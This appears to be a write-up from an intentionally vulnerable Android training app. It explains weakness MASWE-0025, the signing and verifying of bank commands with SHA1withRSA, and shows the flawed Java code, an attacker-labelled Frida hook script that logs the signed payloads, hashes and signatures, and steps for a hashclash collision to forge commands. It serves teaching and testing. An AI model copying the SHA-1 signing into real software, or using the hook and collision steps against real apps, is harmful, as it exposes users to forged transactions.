# MASWE-0025: Improper Generation of Cryptographic Signatures

The relevant code for this vulnerability can be seen in maswe_0025/EncryptionHandler.java.

## The vulnerability consists of:

1. Using SHA1withRSA for creating signatures in the lines here:
```java
public static String sign(String message) throws Exception {
    Signature s = Signature.getInstance("SHA1withRSA");
    s.initSign(getPrivateKey());
    s.update(message.getBytes("UTF-8"));
    byte[] sig = s.sign();
    return Base64.encodeToString(sig, Base64.NO_WRAP);
}
```
2. Using SHA1withRSA for verifying digital signatures in the lines here:
```java
public static boolean verify(BankCommand command) throws Exception {
    String payload = command.command + command.amountEuros + command.timestamp
            + command.nonce;
    Signature v = Signature.getInstance("SHA1withRSA");
    v.initVerify(getPublicKey());
    v.update(payload.getBytes("UTF-8"));
    return v.verify(Base64.decode(command.signature, Base64.NO_WRAP));
}
```

## The vulnerability can be exploited by:
The issue is that SHA-1 is considered to be a broken cryptographic algorithm since 2017 when Google published the first public collision (attack) using SHAttered [1].
Collision attacks for SHA-1 are considered practically feasible, as finding two different that produce the same SHA-1 hash takes about 2^63 operations, which is doable with modern ressources, if time is not a limiting factor.
1. Capture the hash of a valid banking command. This can be done by hooking the signing method using frida to dynamically read the values at runtime:
```js
/**
 * Exemplary Frida (js) Script that an attacker could run to hook into the apps process
 * This intercepts the signature creation in real-time
 */
Java.perform(function() {
    var EncryptionHandler = Java.use("com.dkronig.maswe_crypto.maswe_0025.EncryptionHandler");
    
    // Hook the sign method
    EncryptionHandler.sign.implementation = function(message) {
        console.log("[ATTACKER] Intercepted sign() call");
        console.log("[ATTACKER] Payload being signed: " + message);
        
        // Calculate what hash will be produced
        var MessageDigest = Java.use("java.security.MessageDigest");
        var sha1 = MessageDigest.getInstance("SHA-1");
        var payloadBytes = message.getBytes("UTF-8");
        var hash = sha1.digest(payloadBytes);
        
        console.log("[ATTACKER] SHA-1 Hash: " + bytesToHex(hash));
        
        // Call original method
        var signature = this.sign(message);
        console.log("[ATTACKER] Signature: " + signature);
        
        // Attacker now has everything needed
        return signature;
    };
    
    // Hook the verify method to see what's being verified
    EncryptionHandler.verify.implementation = function(command) {
        console.log("[ATTACKER] Verify called for command:");
        console.log("[ATTACKER] Command: " + command.command.value);
        console.log("[ATTACKER] Amount: " + command.amountEuros.value);
        console.log("[ATTACKER] Timestamp: " + command.timestamp.value);
        console.log("[ATTACKER] Nonce: " + command.nonce.value);
        console.log("[ATTACKER] Signature: " + command.signature.value);
        
        return this.verify(command);
    };
});
```
2. Use libraries such as hashclash [2] to find a collision instead of brute forcing it. This could still take days to weeks.
3. Once a second message resulting in a collision has been found, this can then be used to send "illegitimate" commands to the banking service, since signing this second message will result in the same valid hash as the first "legitimate" one. This is a big security vulnerability.

## Interesting Links and Sources
[1] [The SHAttered project](https://shattered.io/)  
[2] [HashClash GitHub Repository](https://github.com/cr-marcstevens/hashclash)  
[Reddit Discussion on SHA-1 broken](https://www.reddit.com/r/linux/comments/eqy1kh/sha1_is_now_fully_broken/)
